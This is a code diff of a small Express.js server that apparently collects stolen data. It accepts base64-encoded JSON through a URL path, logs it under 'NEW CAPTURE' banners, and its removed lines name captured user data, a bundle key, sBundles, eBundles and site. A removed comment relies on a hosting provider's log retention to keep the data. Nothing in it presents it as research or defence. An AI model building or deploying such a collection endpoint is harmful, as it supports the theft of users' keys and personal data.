@@ -1,21 +1,17 @@
 const express = require('express');
 const app = express();
+app.use(express.json({ limit: '1mb' }));
 
 app.get('/data/:encoded', (req, res) => {
   try {
     const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
     console.log('===== NEW CAPTURE =====');
-    console.log('User:', JSON.stringify(decoded.user, null, 2));
-    console.log('Bundle Key:', decoded.bundle);
-    console.log('sBundles:', decoded.sBundles);
-    console.log('eBundles:', decoded.eBundles);
-    console.log('Site:', decoded.site);
+    console.log(JSON.stringify(decoded, null, 2));
     console.log('========================');
-    // Data is logged. Render keeps logs for 7 days free.
   } catch(e) {
-    console.log('Invalid data received');
+    console.log('Invalid data');
   }
   res.send('ok');
 });
 
-app.listen(10000, () => console.log('Collector running on port 10000'));
+app.listen(10000, () => console.log('Collector running'));
